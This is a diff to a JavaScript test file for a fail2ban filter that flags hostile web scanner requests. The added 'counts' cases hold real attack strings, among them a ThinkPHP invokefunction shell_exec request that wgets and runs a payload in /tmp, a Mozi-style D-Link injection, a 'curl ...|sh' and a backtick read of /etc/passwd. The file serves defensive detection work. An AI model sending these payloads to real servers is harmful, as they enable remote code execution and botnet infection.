@@ -1427,6 +1427,10 @@ describe('fail2ban scanner filter', () => {
       ['a D-Link command injection with no method', '27;wget%20http://%s:%d/Mozi.m%20-O%20->%20/tmp/Mozi.m;chmod%20777%20/tmp/Mozi.m;/tmp/Mozi.m%20dlink.mips%27$ HTTP/1.0'],
       ['another bare method', 'OPTIONS'],
       ['binary bytes beside a quote escape', '\\x22\\x16\\x03\\x01'],
+      ['the ThinkPHP invokefunction exploit with a raw space and a quoted wget', "GET /index.php?s=/index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget -q http://203.0.113.9/a/k.x86 -O /tmp/.k||wget -q http://203.0.113.9/a/k.arm7 -O /tmp/.k; chmod 777 /tmp/.k; /tmp/.k selfrep.thinkphp' HTTP/1.1"],
+      ['a raw space then a backtick command', 'GET /cgi-bin/x?cmd= `cat /etc/passwd` HTTP/1.1'],
+      ['a raw space then an unquoted curl', 'GET /x?cmd= curl http://203.0.113.9/a|sh HTTP/1.1'],
+      ['a raw space then busybox', 'GET /setup.cgi?cmd= busybox wget http://203.0.113.9/a HTTP/1.1'],
     ])('counts %s', (_name, request) => {
       expect(strikeHost(line(request))).toBe('65.49.1.122');
       // Also once fail2ban has removed the timestamp.
@@ -1481,6 +1485,12 @@ describe('fail2ban scanner filter', () => {
       ['a URL path that contains t3 and a digit', 'GET /t3 1 HTTP/1.1', 400, '"-"'],
       ['a quote in a hand-typed query', 'GET /?q=\\x22x\\x22 HTTP/1.1', 400, '"Mozilla/5.0"'],
       ['a backslash in a hand-typed query', 'GET /api/v1/laws?q=a\\x5Cb HTTP/1.1', 400, '"Mozilla/5.0"'],
+      ['a raw space in a hand-typed query', 'GET /search?q=a b HTTP/1.1', 400, '"Mozilla/5.0"'],
+      ['a raw space before a word that only starts like a shell word', 'GET /search?q=a shell HTTP/1.1', 400, '"Mozilla/5.0"'],
+      ['a raw space before a shell word that ends the URL', 'GET /search?q=a curl HTTP/1.1', 400, '"Mozilla/5.0"'],
+      ['the ThinkPHP line answered with a 200', "GET /index.php?s=/x&v= 'wget -q http://203.0.113.9/a' HTTP/1.1", 200, '"-"'],
+      ['a lower-case method before a raw-space command', "get /x?v= 'wget -q http://x/a' HTTP/1.1", 400, '"-"'],
+      ['a normal GET whose user agent starts with curl', 'GET /law/1 HTTP/1.1', 400, '"curl/8.4.0"'],
     ])('ignores %s', (_name, request, status, agent) => {
       expect(strikeHost(line(request, status, agent))).toBeUndefined();
     });
